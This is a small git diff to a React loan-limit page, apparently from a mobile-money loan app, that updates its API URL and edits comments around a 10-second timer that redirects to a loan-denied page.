@@ -2,7 +2,8 @@ import { useState, useRef } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Wallet, CheckCircle2 } from "lucide-react";
 
-const API_URL = "https://fastloan-momo.onrender.com";
+// ✅ UPDATED TO NEW RENDER URL
+const API_URL = "https://fastloan-momo-kj8m.onrender.com";
 
 const LoanLimit = () => {
   const [amount, setAmount] = useState(100000); 
@@ -23,7 +24,7 @@ const LoanLimit = () => {
     setIsProcessing(true);
     console.log("⏳ Timer started for 10 seconds...");
 
-    // ✅ CHANGED TO 10 SECONDS FOR FAST TESTING (Change 10000 to 60000 later)
+    // ✅ 10 SECONDS FOR TESTING (Change to 60000 for 1 minute)
     timerRef.current = setTimeout(() => {
       console.log("⏰ 10 seconds passed! Redirecting to denied...");
       setIsProcessing(false);
@@ -51,7 +52,6 @@ const LoanLimit = () => {
           }
         }, 3000);
       } else {
-        // If backend doesn't return pending, redirect immediately
         if (timerRef.current) clearTimeout(timerRef.current);
         setIsProcessing(false);
         navigate("/loan-denied");
